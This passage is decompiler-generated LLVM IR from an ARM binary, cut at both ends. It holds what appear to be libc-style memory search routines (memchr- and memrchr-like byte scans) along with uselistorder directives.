  uselistorder i32 %v12_11fa8, { 1, 0, 3, 2 }
  uselistorder i32 %v8_11f88, { 1, 0, 2 }
  uselistorder i32 %v5_11f88, { 1, 0, 2 }
  uselistorder i32 %v2_11f88, { 1, 0, 2 }
  uselistorder i32 %v3_11f84, { 1, 0 }
  uselistorder i32 %v0_11f88, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11fa8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v4_11f60, { 0, 2, 1 }
  uselistorder i32 %v3_11f54, { 1, 0 }
  uselistorder i32 %v2_11f4c, { 0, 2, 1, 3 }
  uselistorder i32 %v12_11f3c, { 1, 0, 3, 2 }
  uselistorder i32 %v8_11f1c, { 1, 0, 2 }
  uselistorder i32 %v5_11f1c, { 1, 0, 2 }
  uselistorder i32 %v2_11f1c, { 1, 0, 2 }
  uselistorder i32 %v3_11f18, { 1, 0 }
  uselistorder i32 %v0_11f1c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11f3c, { 4, 3, 2, 1, 0 }
  uselistorder i1 %v5_11fe4, { 2, 0, 1 }
  uselistorder i32 %v0_11fe8, { 3, 0, 2, 1 }
  uselistorder i32 %v0_11f3c75, { 0, 3, 1, 4, 2, 5 }
  uselistorder i32 %v1_11eec, { 1, 0 }
  uselistorder i32 %v0_11eec, { 3, 1, 0, 2 }
  uselistorder i32 %v2_11ee4, { 3, 4, 0, 5, 2, 1 }
  uselistorder i32 %v1_11ee4, { 1, 0, 2 }
  uselistorder i32 %v0_11ee4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_11f3c76, { 2, 1, 0 }
  uselistorder i32 %v1_11ec4, { 1, 0, 2 }
  uselistorder i32 %v1_11e9c, { 0, 1, 3, 4, 2, 5 }
  uselistorder i32 %v0_11e9c, { 1, 2, 0, 3 }
  uselistorder i32 %v8_11e88, { 1, 0, 2 }
  uselistorder i32 %v6_11e84, { 1, 0 }
  uselistorder i32 %v2_11e7c, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 %v0_11e7c, { 1, 2, 4, 0, 3 }
  uselistorder i32 %v7_11e8c, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v4_11e74, { 0, 2, 1 }
  uselistorder i1 %v0_11e74, { 1, 0 }
  uselistorder i1 %v1_11e74, { 1, 0 }
  uselistorder i32 %v3_11e70, { 0, 4, 3, 2, 1 }
  uselistorder i32 %v1_11e68, { 0, 2, 1, 3 }
  uselistorder i32 %v4_11e54, { 1, 0 }
  uselistorder i32 %v12_11e48, { 0, 1, 3, 2 }
  uselistorder i32 %v0_11e3c, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_11e40, { 0, 1, 2, 3, 4, 5, 6, 7, 12, 11, 10, 9, 8 }
  uselistorder i32 %v2_11e30, { 0, 2, 1 }
  uselistorder i32 %v2_11e28, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_11e28, { 1, 2, 5, 0, 4, 3 }
  uselistorder i32 %v1_11e20, { 1, 0 }
  uselistorder i32 %v1_11e18, { 2, 1, 0 }
  uselistorder i32 %v2_11e10, { 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_11e10, { 1, 0, 2, 3 }
  uselistorder i32 %v2_11e00, { 1, 0 }
  uselistorder i32 %v1_11e00, { 1, 5, 3, 4, 0, 6, 8, 2, 7, 9 }
  uselistorder i32 %v0_11e00, { 1, 7, 9, 8, 6, 4, 0, 5, 11, 2, 3, 10, 12 }
  uselistorder i8** %stack_var_-8, { 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 16, 17, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 25, 26, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* %r3.global-to-local, { 0, 9, 1, 2, 3, 10, 4, 5, 6, 11, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i32* %r2.global-to-local, { 0, 60, 1, 2, 3, 4, 5, 61, 6, 7, 8, 9, 10, 62, 11, 12, 13, 14, 15, 63, 16, 18, 17, 19, 20, 21, 22, 23, 24, 26, 25, 27, 28, 29, 64, 65, 66, 67, 69, 68, 30, 31, 56, 32, 33, 34, 35, 36, 57, 37, 38, 39, 40, 41, 58, 42, 44, 43, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 59 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 12, 1, 3, 6, 4, 13, 5, 7, 10, 8, 14, 9, 11, 15, 16, 17, 35, 36, 34, 18, 19, 22, 20, 28, 21, 23, 26, 24, 29, 25, 27, 30, 31, 32, 33 }
  uselistorder i32* %r0.global-to-local, { 3, 50, 4, 5, 51, 6, 7, 52, 8, 9, 10, 11, 12, 13, 53, 14, 16, 15, 17, 18, 54, 19, 20, 55, 21, 22, 23, 24, 56, 57, 59, 60, 25, 32, 26, 27, 33, 28, 29, 30, 31, 34, 35, 0, 36, 37, 39, 38, 40, 41, 58, 42, 43, 44, 47, 45, 46, 48, 49, 1, 2 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 13, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i1* %cpsr_v.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 3, 21, 22, 41, 0, 42, 1, 24, 2, 25, 23, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40 }
  uselistorder i1* %cpsr_n.global-to-local, { 4, 7, 5, 9, 6, 10, 8, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 3, 22, 23, 45, 46, 47, 0, 48, 1, 25, 2, 26, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44 }
  uselistorder i32 -20, { 1, 0 }
  uselistorder i32 2147483632, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32 -5, { 1, 0, 2 }
  uselistorder i32 -12, { 0, 12, 13, 1, 15, 16, 2, 17, 18, 14, 11, 10, 9, 8, 7, 19, 20, 21, 3, 4, 5, 22, 6, 23, 24, 25, 26, 27, 28 }
  uselistorder i32 -16, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 6, 5, 4, 1, 16, 17, 18, 19, 20, 21, 3, 2, 0, 22 }
  uselistorder i32 27, { 1, 0 }
  uselistorder i32 -28, { 1, 2, 0 }
  uselistorder i32 -8, { 16, 17, 18, 19, 20, 21, 15, 14, 6, 13, 12, 11, 10, 22, 23, 24, 25, 7, 26, 27, 2, 0, 30, 9, 28, 29, 1, 32, 33, 3, 8, 4, 5, 31 }
  uselistorder label %dec_label_pc_12268, { 2, 0, 1 }
  uselistorder label %dec_label_pc_121fc, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12190, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12130, { 1, 0 }
  uselistorder label %.thread26, { 2, 0, 1 }
  uselistorder label %.thread122, { 1, 0 }
  uselistorder label %bb143, { 4, 5, 6, 1, 7, 0, 2, 3 }
  uselistorder label %dec_label_pc_120bc, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_12080, { 1, 0 }
  uselistorder label %dec_label_pc_1206c, { 1, 0 }
  uselistorder label %dec_label_pc_1202c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_11fc0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11f54, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11ef4, { 1, 0 }
  uselistorder label %.thread12, { 2, 0, 1 }
  uselistorder label %.thread121, { 1, 0 }
  uselistorder label %.thread120, { 1, 0 }
  uselistorder label %bb133, { 6, 4, 5, 1, 7, 0, 2, 3 }
  uselistorder label %.thread118, { 1, 0 }
  uselistorder label %dec_label_pc_11e68, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_11e28, { 1, 0 }
}

define i32 @function_12288(i32 %arg1) local_unnamed_addr {
dec_label_pc_12288:
  ret i32 %arg1
}

define i32 @function_12290(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_12290:
  %v0_12290 = load i32, i32* @r0, align 4
  %v1_12290 = load i32, i32* @r1, align 4
  %v2_12290 = inttoptr i32 %v0_12290 to i8*
  %v3_12290 = call i32 @function_11e00(i8* %v2_12290, i32 %v1_12290)
  ret i32 %v3_12290

; uselistorder directives
  uselistorder i32 (i8*, i32)* @function_11e00, { 0, 2, 1 }
}

define i32 @function_122a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_122a0:
  %v3_122a0 = load i32, i32* @r4, align 4
  %v6_122a0 = load i32, i32* @r5, align 4
  %v9_122a0 = load i32, i32* @r6, align 4
  %v1_122a4 = urem i32 %arg1, 256
  %v0_122c018 = load i32, i32* @r2, align 4
  %v2_122c020 = icmp eq i32 %v0_122c018, 0
  br i1 %v2_122c020, label %dec_label_pc_122d0, label %dec_label_pc_122c8

dec_label_pc_122ac:                               ; preds = %dec_label_pc_122c8
  %v3_122ac = load i8, i8* %.021, align 1
  %v4_122ac = zext i8 %v3_122ac to i32
  %v9_122b0 = icmp eq i32 %v4_122ac, %v1_122a4
  %v1_122b4 = add i32 %v0_122b4, -1
  br i1 %v9_122b0, label %bb, label %dec_label_pc_122c0

bb:                                               ; preds = %dec_label_pc_122ac
  ret i32 %v1_122c8

dec_label_pc_122c0:                               ; preds = %dec_label_pc_122ac
  %v2_122bc = add i32 %v1_122c8, 1
  %v3_122bc = inttoptr i32 %v2_122bc to i8*
  %v2_122c0 = icmp eq i32 %v1_122b4, 0
  br i1 %v2_122c0, label %dec_label_pc_122d0, label %dec_label_pc_122c8

dec_label_pc_122c8:                               ; preds = %dec_label_pc_122a0, %dec_label_pc_122c0
  %v0_122b4 = phi i32 [ %v1_122b4, %dec_label_pc_122c0 ], [ %v0_122c018, %dec_label_pc_122a0 ]
  %.021 = phi i8* [ %v3_122bc, %dec_label_pc_122c0 ], [ undef, %dec_label_pc_122a0 ]
  %v1_122c8 = ptrtoint i8* %.021 to i32
  %v2_122c8 = urem i32 %v1_122c8, 4
  %v3_122c8 = icmp eq i32 %v2_122c8, 0
  br i1 %v3_122c8, label %dec_label_pc_122d0, label %dec_label_pc_122ac

dec_label_pc_122d0:                               ; preds = %dec_label_pc_122c0, %dec_label_pc_122c8, %dec_label_pc_122a0
  %v0_1235c37 = phi i32 [ 0, %dec_label_pc_122a0 ], [ 0, %dec_label_pc_122c0 ], [ %v0_122b4, %dec_label_pc_122c8 ]
  %.0.lcssa = phi i8* [ undef, %dec_label_pc_122a0 ], [ %v3_122bc, %dec_label_pc_122c0 ], [ %.021, %dec_label_pc_122c8 ]
  %v4_122d0 = mul nuw nsw i32 %v1_122a4, 256
  %v5_122d0 = or i32 %v4_122d0, %v1_122a4
  %v1_122d4 = ptrtoint i8* %.0.lcssa to i32
  store i32 %v1_122d4, i32* @ip, align 4
  %v4_122d8 = mul i32 %v5_122d0, 65536
  %v5_122d8 = or i32 %v4_122d8, %v5_122d0
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_1235c37, 3
  br i1 %tmp, label %dec_label_pc_122e0, label %dec_label_pc_12384.preheader

dec_label_pc_122e0:                               ; preds = %dec_label_pc_122d0, %dec_label_pc_1235c.backedge
  %v0_122fc82 = phi i32 [ %v1_122fc, %dec_label_pc_1235c.backedge ], [ %v0_1235c37, %dec_label_pc_122d0 ]
  %v0_122e081 = phi i32 [ %v4_122e0, %dec_label_pc_1235c.backedge ], [ %v1_122d4, %dec_label_pc_122d0 ]
  %v1_122e0 = inttoptr i32 %v0_122e081 to i32*
  %v2_122e0 = load i32, i32* %v1_122e0, align 4
  %v4_122e0 = add i32 %v0_122e081, 4
  store i32 %v4_122e0, i32* @ip, align 4
  %v2_122e4 = xor i32 %v2_122e0, %v5_122d8
  %v2_122e8 = add i32 %v2_122e4, 2130640639
  %v1_122ec = sub i32 -1, %v2_122e4
  %v2_122f0 = xor i32 %v2_122e8, %v1_122ec
  %v2_122f4 = and i32 %v2_122f0, -2130640640
  %v2_122f8 = icmp eq i32 %v2_122f4, 0
  %v1_122fc = add i32 %v0_122fc82, -4
  br i1 %v2_122f8, label %dec_label_pc_1235c.backedge, label %dec_label_pc_12304

dec_label_pc_1235c.backedge:                      ; preds = %dec_label_pc_122e0, %dec_label_pc_12348
  store i32 -2130640640, i32* @lr, align 4
  %tmp107 = icmp ugt i32 %v1_122fc, 3
  br i1 %tmp107, label %dec_label_pc_122e0, label %dec_label_pc_12384.preheader

dec_label_pc_12304:                               ; preds = %dec_label_pc_122e0
  %v2_12304 = inttoptr i32 %v0_122e081 to i8*
  %v3_12304 = load i8, i8* %v2_12304, align 1
  %v4_12304 = zext i8 %v3_12304 to i32
  %v9_1230c = icmp eq i32 %v4_12304, %v1_122a4
  %v1_12310 = add i32 %v0_122e081, 3
  %v1_12314 = add i32 %v0_122e081, 1
  store i32 %v1_12314, i32* @lr, align 4
  %v1_12318 = add i32 %v0_122e081, 2
  br i1 %v9_1230c, label %bb50, label %bb51

bb50:                                             ; preds = %dec_label_pc_12304
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v6_122a0, i32* @r5, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  ret i32 %v0_122e081

bb51:                                             ; preds = %dec_label_pc_12304
  %v2_12320 = inttoptr i32 %v1_12314 to i8*
  %v3_12320 = load i8, i8* %v2_12320, align 1
  %v4_12320 = zext i8 %v3_12320 to i32
  %v9_12324 = icmp eq i32 %v4_12320, %v1_122a4
  br i1 %v9_12324, label %dec_label_pc_1232c, label %dec_label_pc_12334

dec_label_pc_1232c:                               ; preds = %bb51
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v6_122a0, i32* @r5, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  ret i32 %v1_12314

dec_label_pc_12334:                               ; preds = %bb51
  %v2_12334 = inttoptr i32 %v1_12318 to i8*
  %v3_12334 = load i8, i8* %v2_12334, align 1
  %v4_12334 = zext i8 %v3_12334 to i32
  %v9_12338 = icmp eq i32 %v4_12334, %v1_122a4
  br i1 %v9_12338, label %dec_label_pc_12340, label %dec_label_pc_12348

dec_label_pc_12340:                               ; preds = %dec_label_pc_12334
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v6_122a0, i32* @r5, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  ret i32 %v1_12318

dec_label_pc_12348:                               ; preds = %dec_label_pc_12334
  %v2_12348 = inttoptr i32 %v1_12310 to i8*
  %v3_12348 = load i8, i8* %v2_12348, align 1
  %v4_12348 = zext i8 %v3_12348 to i32
  %v9_1234c = icmp eq i32 %v4_12348, %v1_122a4
  br i1 %v9_1234c, label %dec_label_pc_12354, label %dec_label_pc_1235c.backedge

dec_label_pc_12354:                               ; preds = %dec_label_pc_12348
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v6_122a0, i32* @r5, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  ret i32 %v1_12310

dec_label_pc_12384.preheader:                     ; preds = %dec_label_pc_1235c.backedge, %dec_label_pc_122d0
  %v0_122e0.lcssa = phi i32 [ %v1_122d4, %dec_label_pc_122d0 ], [ %v4_122e0, %dec_label_pc_1235c.backedge ]
  %v0_122fc.lcssa = phi i32 [ %v0_1235c37, %dec_label_pc_122d0 ], [ %v1_122fc, %dec_label_pc_1235c.backedge ]
  %v2_1238411 = icmp eq i32 %v0_122fc.lcssa, 0
  br i1 %v2_1238411, label %dec_label_pc_1238c, label %dec_label_pc_12374

dec_label_pc_12374:                               ; preds = %dec_label_pc_12384, %dec_label_pc_12384.preheader
  %v0_12384.in = phi i32 [ %v0_12384, %dec_label_pc_12384 ], [ %v0_122fc.lcssa, %dec_label_pc_12384.preheader ]
  %v15_1237c = phi i32 [ %v1_12380, %dec_label_pc_12384 ], [ %v0_122e0.lcssa, %dec_label_pc_12384.preheader ]
  %v0_12384 = add i32 %v0_12384.in, -1
  %v1_12374 = inttoptr i32 %v15_1237c to i8*
  %v2_12374 = load i8, i8* %v1_12374, align 1
  %v3_12374 = zext i8 %v2_12374 to i32
  %v9_12378 = icmp eq i32 %v3_12374, %v1_122a4
  br i1 %v9_12378, label %bb52, label %dec_label_pc_12384

bb52:                                             ; preds = %dec_label_pc_12374
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v6_122a0, i32* @r5, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  ret i32 %v15_1237c

dec_label_pc_12384:                               ; preds = %dec_label_pc_12374
  %v1_12380 = add i32 %v15_1237c, 1
  %v2_12384 = icmp eq i32 %v0_12384, 0
  br i1 %v2_12384, label %dec_label_pc_1238c, label %dec_label_pc_12374

dec_label_pc_1238c:                               ; preds = %dec_label_pc_12384, %dec_label_pc_12384.preheader
  store i32 %v3_122a0, i32* @r4, align 4
  store i32 %v6_122a0, i32* @r5, align 4
  store i32 %v9_122a0, i32* @r6, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v15_1237c, { 1, 0, 2 }
  uselistorder i32 %v1_122fc, { 1, 0, 2 }
  uselistorder i32 %v4_122e0, { 0, 2, 1 }
  uselistorder i32 %v0_122e081, { 0, 6, 5, 4, 3, 1, 2 }
  uselistorder i32 %v5_122d0, { 1, 0 }
  uselistorder i32 %v0_1235c37, { 1, 2, 0 }
  uselistorder i32 %v1_122a4, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_122a0, { 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1235c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_122e0, { 1, 0 }
  uselistorder label %dec_label_pc_122d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_122c8, { 1, 0 }
}

define i32 @function_1239c(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1239c:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_123a8 = call i32 @function_ec10()
  %v0_123ac = load i32, i32* @r5, align 4
  %v1_123ac = load i32, i32* @r4, align 4
  %v2_123ac = add i32 %v1_123ac, %v0_123ac
  ret i32 %v2_123ac
}

define i32 @function_123b4(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_123b4:
  %v3_123b4 = load i32, i32* @r4, align 4
  %v1_123b8 = urem i32 %arg2, 256
  %v2_123bc = add i32 %arg3, %arg1
  %v2_123d42 = icmp eq i32 %arg3, 0
  br i1 %v2_123d42, label %dec_label_pc_123e4, label %dec_label_pc_123dc

dec_label_pc_123c4:                               ; preds = %dec_label_pc_123dc
  %v1_123c4 = add i32 %v0_123c4, -1
  %v2_123c4 = inttoptr i32 %v1_123c4 to i8*
  %v3_123c4 = load i8, i8* %v2_123c4, align 1
  %v4_123c4 = zext i8 %v3_123c4 to i32
  %v9_123c8 = icmp eq i32 %v4_123c4, %v1_123b8
  br i1 %v9_123c8, label %bb, label %dec_label_pc_123d4

bb:                                               ; preds = %dec_label_pc_123c4
  ret i32 %v1_123c4

dec_label_pc_123d4:                               ; preds = %dec_label_pc_123c4
  %v1_123d0 = add i32 %v0_123d0, -1
  %v2_123d4 = icmp eq i32 %v1_123d0, 0
  br i1 %v2_123d4, label %dec_label_pc_123e4, label %dec_label_pc_123dc

dec_label_pc_123dc:                               ; preds = %dec_label_pc_123b4, %dec_label_pc_123d4
  %v0_123d0 = phi i32 [ %v1_123d0, %dec_label_pc_123d4 ], [ %arg3, %dec_label_pc_123b4 ]
  %v0_123c4 = phi i32 [ %v1_123c4, %dec_label_pc_123d4 ], [ %v2_123bc, %dec_label_pc_123b4 ]
  %v1_123dc = urem i32 %v0_123c4, 4
  %v2_123dc = icmp eq i32 %v1_123dc, 0
  br i1 %v2_123dc, label %dec_label_pc_123e4, label %dec_label_pc_123c4

dec_label_pc_123e4:                               ; preds = %dec_label_pc_123d4, %dec_label_pc_123dc, %dec_label_pc_123b4
  %v0_1247c11 = phi i32 [ %v2_123bc, %dec_label_pc_123b4 ], [ %v1_123c4, %dec_label_pc_123d4 ], [ %v0_123c4, %dec_label_pc_123dc ]
  %v0_124687 = phi i32 [ 0, %dec_label_pc_123b4 ], [ 0, %dec_label_pc_123d4 ], [ %v0_123d0, %dec_label_pc_123dc ]
  %v4_123e4 = mul nuw nsw i32 %v1_123b8, 256
  %v5_123e4 = or i32 %v4_123e4, %v1_123b8
  %v4_123e8 = mul i32 %v5_123e4, 65536
  %v5_123e8 = or i32 %v4_123e8, %v5_123e4
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp = icmp ugt i32 %v0_124687, 3
  br i1 %tmp, label %dec_label_pc_123f0, label %dec_label_pc_12478

dec_label_pc_123f0:                               ; preds = %dec_label_pc_123e4, %.backedge.backedge
  %v0_1240c51 = phi i32 [ %v1_1240c, %.backedge.backedge ], [ %v0_124687, %dec_label_pc_123e4 ]
  %v0_123f050 = phi i32 [ %v1_123f0, %.backedge.backedge ], [ %v0_1247c11, %dec_label_pc_123e4 ]
  %v1_123f0 = add i32 %v0_123f050, -4
  %v2_123f0 = inttoptr i32 %v1_123f0 to i32*
  %v3_123f0 = load i32, i32* %v2_123f0, align 4
  %v2_123f4 = xor i32 %v3_123f0, %v5_123e8
  %v2_123f8 = add i32 %v2_123f4, 2130640639
  %v1_123fc = sub i32 -1, %v2_123f4
  %v2_12400 = xor i32 %v2_123f8, %v1_123fc
  %v2_12404 = and i32 %v2_12400, -2130640640
  %v2_12408 = icmp eq i32 %v2_12404, 0
  %v1_1240c = add i32 %v0_1240c51, -4
  br i1 %v2_12408, label %.backedge.backedge, label %dec_label_pc_12414

dec_label_pc_12414:                               ; preds = %dec_label_pc_123f0
  %v1_12414 = add i32 %v0_123f050, -1
  %v2_12414 = inttoptr i32 %v1_12414 to i8*
  %v3_12414 = load i8, i8* %v2_12414, align 1
  %v4_12414 = zext i8 %v3_12414 to i32
  %v9_12418 = icmp eq i32 %v4_12414, %v1_123b8
  %v1_1241c = add i32 %v0_123f050, -2
  store i32 %v1_1241c, i32* @ip, align 4
  %v1_12424 = add i32 %v0_123f050, -3
  store i32 %v1_12424, i32* @lr, align 4
  br i1 %v9_12418, label %dec_label_pc_1242c, label %dec_label_pc_12434

dec_label_pc_1242c:                               ; preds = %dec_label_pc_12414
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 %v1_12414

dec_label_pc_12434:                               ; preds = %dec_label_pc_12414
  %v2_12434 = inttoptr i32 %v1_1241c to i8*
  %v3_12434 = load i8, i8* %v2_12434, align 1
  %v4_12434 = zext i8 %v3_12434 to i32
  %v9_12438 = icmp eq i32 %v4_12434, %v1_123b8
  br i1 %v9_12438, label %dec_label_pc_12440, label %dec_label_pc_12448

dec_label_pc_12440:                               ; preds = %dec_label_pc_12434
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 %v1_1241c

dec_label_pc_12448:                               ; preds = %dec_label_pc_12434
  %v2_12448 = inttoptr i32 %v1_12424 to i8*
  %v3_12448 = load i8, i8* %v2_12448, align 1
  %v4_12448 = zext i8 %v3_12448 to i32
  %v9_1244c = icmp eq i32 %v4_12448, %v1_123b8
  br i1 %v9_1244c, label %dec_label_pc_12454, label %dec_label_pc_1245c

dec_label_pc_12454:                               ; preds = %dec_label_pc_12448
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 %v1_12424

dec_label_pc_1245c:                               ; preds = %dec_label_pc_12448
  %v1_1245c = inttoptr i32 %v1_123f0 to i8*
  %v2_1245c = load i8, i8* %v1_1245c, align 1
  %v3_1245c = zext i8 %v2_1245c to i32
  %v9_12460 = icmp eq i32 %v3_1245c, %v1_123b8
  br i1 %v9_12460, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_1245c, %dec_label_pc_123f0
  store i32 2130640639, i32* @ip, align 4
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_1240c, 3
  br i1 %tmp70, label %dec_label_pc_123f0, label %dec_label_pc_12478

bb19:                                             ; preds = %dec_label_pc_1245c
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 %v1_123f0

dec_label_pc_1247c:                               ; preds = %dec_label_pc_12478
  %v1_12488 = add i32 %v0_12488, -1
  %v1_1247c = add i32 %v0_1247c, -1
  %v2_1247c = inttoptr i32 %v1_1247c to i8*
  %v3_1247c = load i8, i8* %v2_1247c, align 1
  %v4_1247c = zext i8 %v3_1247c to i32
  %v9_12480 = icmp eq i32 %v4_1247c, %v1_123b8
  br i1 %v9_12480, label %bb20, label %dec_label_pc_12478

bb20:                                             ; preds = %dec_label_pc_1247c
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 %v1_1247c

dec_label_pc_12478:                               ; preds = %dec_label_pc_123e4, %.backedge.backedge, %dec_label_pc_1247c
  %v0_1247c = phi i32 [ %v1_1247c, %dec_label_pc_1247c ], [ %v0_1247c11, %dec_label_pc_123e4 ], [ %v1_123f0, %.backedge.backedge ]
  %v0_12488 = phi i32 [ %v1_12488, %dec_label_pc_1247c ], [ %v0_124687, %dec_label_pc_123e4 ], [ %v1_1240c, %.backedge.backedge ]
  %v2_12488 = icmp eq i32 %v0_12488, 0
  br i1 %v2_12488, label %dec_label_pc_12490, label %dec_label_pc_1247c

dec_label_pc_12490:                               ; preds = %dec_label_pc_12478
  store i32 %v3_123b4, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_12488, { 1, 0 }
  uselistorder i32 %v1_1240c, { 1, 0, 2 }
  uselistorder i32 %v1_123f0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_123f050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_123e4, { 1, 0 }
  uselistorder i32 %v0_124687, { 1, 2, 0 }
  uselistorder i32 %v0_123c4, { 1, 0, 2 }
  uselistorder i32 %v1_123c4, { 0, 2, 1, 3 }
  uselistorder i32 %v2_123bc, { 1, 0 }
  uselistorder i32 %v1_123b8, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_123b4, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 -2, { 3, 5, 6, 4, 14, 7, 11, 8, 0, 13, 12, 15, 1, 9, 2, 10, 16, 17 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_12478, { 2, 1, 0 }
  uselistorder label %dec_label_pc_123f0, { 1, 0 }
  uselistorder label %dec_label_pc_123e4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_123dc, { 1, 0 }
}

define i32 @function_124a0() local_unnamed_addr {
dec_label_pc_124a0:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_124a0 = load i32, i32* @r4, align 4
  store i32 %v3_124a0, i32* %stack_var_-16, align 4
  %v6_124a0 = load i32, i32* @r5, align 4
  %v0_124a4 = load i32, i32* @r0, align 4
  store i32 %v0_124a4, i32* %r4.global-to-local, align 4
  %v2_124a4 = icmp eq i32 %v0_124a4, 0
  %v1_124a8 = load i32, i32* @r2, align 4
  br i1 %v2_124a4, label %bb, label %dec_label_pc_124a0._crit_edge

bb:                                               ; preds = %dec_label_pc_124a0
  %v2_124a8 = inttoptr i32 %v1_124a8 to i32*
  %v3_124a8 = load i32, i32* %v2_124a8, align 4
  store i32 %v3_124a8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_124a0._crit_edge

dec_label_pc_124a0._crit_edge:                    ; preds = %dec_label_pc_124a0, %bb
  %v0_124ac = phi i32 [ %v3_124a8, %bb ], [ %v0_124a4, %dec_label_pc_124a0 ]
  store i32 %v0_124ac, i32* @r0, align 4
  store i32 %v1_124a8, i32* @r5, align 4
  %v0_124b4 = load i32, i32* @r1, align 4
  store i32 %v0_124b4, i32* %r6.global-to-local, align 4
  %v1_124b8 = inttoptr i32 %v0_124ac to i8*
  %v2_124b8 = call i32 @function_137e0(i8* %v1_124b8)
  %v0_124bc = load i32, i32* %r4.global-to-local, align 4
  %v2_124bc = add i32 %v0_124bc, %v2_124b8
  %v3_124bc = inttoptr i32 %v2_124bc to i8*
  %v4_124bc = load i8, i8* %v3_124bc, align 1
  %v6_124bc = zext i8 %v4_124bc to i32
  store i32 %v6_124bc, i32* %r3.global-to-local, align 4
  store i32 %v2_124bc, i32* @r4, align 4
  %v2_124c4 = icmp eq i8 %v4_124bc, 0
  store i1 %v2_124c4, i1* @cpsr_z, align 1
  %v0_124c8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_124c8, i32* @r1, align 4
  store i32 %v2_124bc, i32* @r0, align 4
  br i1 %v2_124c4, label %bb7, label %dec_label_pc_124d8

bb7:                                              ; preds = %dec_label_pc_124a0._crit_edge
  %v2_124d0 = load i32, i32* @r5, align 4
  %v3_124d0 = inttoptr i32 %v2_124d0 to i32*
